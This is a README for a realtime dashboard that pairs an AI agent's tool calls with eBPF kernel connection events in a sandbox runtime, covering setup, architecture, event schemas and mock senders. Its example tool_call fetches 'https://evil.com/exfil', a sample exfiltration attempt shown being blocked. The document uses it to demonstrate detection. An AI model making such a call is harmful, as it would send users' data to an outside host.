# P5 — Process Viewer

The viewer is the realtime web dashboard for the
[Agent Sandbox Runtime](../README.md). It shows two synchronised event streams
side by side for every sandboxed agent:

- **LEFT panel** — LLM events from the orchestrator (P4): what the AI agent is
  doing — `stdout`, `tool_call`, `stopped`, `crashed`.
- **RIGHT panel** — kernel events from the daemon (P2): what the eBPF layer is
  doing — `connect_attempt`, `connect_allowed`, `connect_blocked`.

When the kernel blocks a connection, the matching tool call on the left lights
up red and a banner spells out the attack — the demo moment that makes the
project's whole thesis visible in one glance.

![Dashboard during a blocked-injection demo](docs/dashboard.png)

---

## One-command startup

From the repository root:

```bash
bash viewer/scripts/start-viewer.sh
```

The script:

1. Verifies Node 20+ is on `PATH`. Node 22+ is only needed for the optional
   kernel mock, which uses Node's built-in `WebSocket`.
2. Runs `npm install` in `server/` and `viewer-app/` only on the first run
   (skipped afterwards).
3. Builds the React app (`viewer-app/dist/`).
4. Starts a single Node process that serves both the dashboard over HTTP and
   the relay over WebSocket on **the same port** (default `8765`).

When it prints `starting on http://localhost:8765`, open that URL in a browser.
P2, P4, and any mock senders connect to the same port over `ws://`.

Override the port with `PORT=9000 bash viewer/scripts/start-viewer.sh`.

### Without the wrapper

If you'd rather run the steps yourself:

```bash
cd viewer/server     && npm install
cd ../viewer-app     && npm install && npm run build
cd ../server         && SERVE_STATIC=1 node server.js
```

Or, with the dashboard served from Vite's dev server (hot reload, two ports):

```bash
# terminal 1 — relay on 8765
cd viewer/server && node server.js
# terminal 2 — dev server on 5173
cd viewer/viewer-app && npm run dev
```

---

## What each panel shows

| UI element | Meaning |
|---|---|
| Header status dot | Pulses green when connected to the relay, red while reconnecting (3s backoff). |
| Header uptime | Wall-clock seconds since the page loaded. |
| Agent tabs | One tab per `agent` field seen on the wire. Click to filter both panels. |
| Stats row — `tool_calls` | Lifetime count of LLM `tool_call` events. |
| Stats row — `allowed` / `blocked` | Lifetime kernel decisions. The `blocked` card scales + glows red on each new block. |
| LEFT panel | LLM event feed. Each row tagged with type, timestamp, and a colour-coded left border. |
| RIGHT panel | Kernel event feed. `connect_blocked` rows flash red for 1.8s. |
| Alert banner (LEFT) | Slides in 300ms after a block, naming the host and reason. Auto-dismisses after 5s, or via the ✕ button. |
| Injection-target marker | The `tool_call` that triggered a block keeps a permanent red border in the LEFT history, so the link survives scroll-back. |

The viewer caps each feed at 500 events and trims the oldest first, so a long
session will not blow up the browser tab.

---

## Architecture

| Decision | Final choice |
|---|---|
| Transport | WebSocket, newline-delimited JSON, no framing layer. |
| Port | One TCP port (default `8765`) shared by HTTP and WebSocket via `http.createServer` + `WebSocketServer({ server })`. |
| Sender / viewer split | First message after connect — `{role:"sender",name}` for emitters, `{role:"viewer"}` for browsers. No handshake within 3s defaults to viewer. |
| Static delivery | Hand-rolled handler in `server.js` (no Express/serve-static). `index.html` → `Cache-Control: no-cache`; `/assets/*` → `immutable, max-age=1y` (Vite hashes filenames). Path-traversal blocked by resolving and checking the `dist/` prefix. |
| Frontend | React 19 + Vite 8, plain CSS, JavaScript only (no TypeScript, no UI libraries). |
| Cross-panel state | Lifted into `App.jsx`. Every event is stamped with a monotonic `_id` so injection-target rows can be looked up via `Set`. |
| Demo data path | Two mock senders (`mock_sender.py`, `mock_kernel_sender.js`) script a 6-step prompt-injection scenario; same shape and cadence the real P2 / P4 components emit. |

```
              ┌──────────────┐         ┌──────────────┐
              │  P4 sender   │         │  P2 sender   │
              │ (orchestr.)  │         │  (daemon)    │
              └──────┬───────┘         └──────┬───────┘
                     │ ws  role:sender        │ ws  role:sender
                     ▼                        ▼
                 ┌─────────────────────────────────┐
                 │   Node relay  (server/server.js)│
                 │   port 8765 — HTTP + WS share   │
                 └────────────────┬────────────────┘
                                  │ ws  role:viewer
                                  ▼
                       ┌────────────────────────┐
                       │  React dashboard       │
                       │  (viewer-app/dist)     │
                       └────────────────────────┘
```

---

## Event schemas

The relay does not validate beyond "is it JSON, does it have a `type`". P2 and
P4 own these shapes; the viewer renders whatever matches.

### LLM events (P4 → LEFT panel)

```json
{
  "agent": "demo-agent",
  "type": "tool_call",
  "ts": 1714000000.123,
  "data": { "tool": "fetch_url", "args": { "url": "https://evil.com/exfil" } }
}
```

`type` ∈ `stdout` | `tool_call` | `stopped` | `crashed`.

### Kernel events (P2 → RIGHT panel)

```json
{
  "agent": "demo-agent",
  "type": "connect_blocked",
  "ts": 1714000000.456,
  "data": {
    "dst_ip": "203.0.113.42",
    "dst_port": 80,
    "hostname": "evil.com",
    "reason": "no policy match"
  }
}
```

`type` ∈ `connect_attempt` | `connect_allowed` | `connect_blocked`.

`agent` is the field that drives tab grouping in the UI — keep it consistent
across every event for a given run, and matched between P2 and P4 emitters
when they describe the same process.

---

## Testing with mocks

The repo ships two stand-alone scripts that emulate P2 and P4 so the dashboard
can be exercised end-to-end without either teammate's daemon running. Both
scripts replay the same prompt-injection scenario at the same cadence, so when
you start them together the LEFT and RIGHT panels stay in sync and the
blocked-alert UI fires.

```bash
# Terminal 1 — viewer (one-command startup)
bash viewer/scripts/start-viewer.sh

# Terminal 2 — LLM mock (Python 3.10+, requires `websockets`)
pip install websockets
python3 viewer/scripts/mock_sender.py

# Terminal 3 — kernel mock (Node 22+)
node viewer/scripts/mock_kernel_sender.js
```

Each mock takes `--host`, `--port`, `--agent`, `--interval`, and `--once`. With
`--once` the scenario runs a single time then exits; without it, the loop
restarts every ~5 s — handy for leaving the demo running.

---

## Connecting real P2 / P4

For teammates plugging real components in:

1. Open a WebSocket to `ws://<viewer-host>:8765` (or whatever `PORT` you set).
2. Send the sender handshake as the very first message:
   ```json
   {"role":"sender","name":"p2-daemon"}
   ```
   (Use `"p4-orchestrator"` from the orchestrator side.)
3. Stream events as newline-delimited JSON matching the schemas above.

The relay broadcasts each event to every connected viewer; the viewer is
stateless — there's no replay on reconnect, so subscribers should be
long-lived.

---

## File layout

```
viewer/
├── README.md                         # this file
├── index.html                        # Week 1 static demo (kept as reference)
├── docs/
│   └── dashboard.png                 # screenshot referenced above
├── server/
│   ├── package.json                  # ws dependency, start scripts
│   └── server.js                     # HTTP + WebSocket relay on one port
├── viewer-app/                       # React 19 + Vite 8 dashboard
│   ├── index.html
│   ├── vite.config.js
│   ├── package.json
│   └── src/
│       ├── App.jsx                   # owns wsStatus + event arrays + cross-panel alert
│       ├── App.css                   # page grid
│       ├── index.css                 # global theme tokens
│       ├── main.jsx
│       └── components/
│           ├── Header.jsx + .css
│           ├── AgentTabs.jsx + .css
│           ├── StatsRow.jsx + .css
│           ├── LLMPanel.jsx
│           ├── KernelPanel.jsx
│           ├── AlertBanner.jsx + .css
│           ├── Panel.css             # shared panel chrome
│           └── EventRow.css          # shared row + bgflash keyframes
└── scripts/
    ├── mock_sender.py                # Python LLM mock for P4
    ├── mock_kernel_sender.js         # Node kernel mock for P2
    └── start-viewer.sh               # one-command boot
```

---

## Requirements

- **Node 20+** — required by `viewer/scripts/start-viewer.sh` and the viewer
  server itself.
- **Node 22+** — only needed if you want to run
  `viewer/scripts/mock_kernel_sender.js`, which uses Node's built-in
  `WebSocket`.
- **npm** — bundled with Node.
- **Python 3.10+** + `websockets` — only if you want to run the LLM mock.
- **A modern browser** — Chrome / Firefox / Safari current versions.

The viewer runs on macOS, Linux, and inside the project's Lima VM with no
changes; nothing in this component is Linux-specific.

---

## License

Apache 2.0, same as the parent project — see [../LICENSE](../LICENSE).
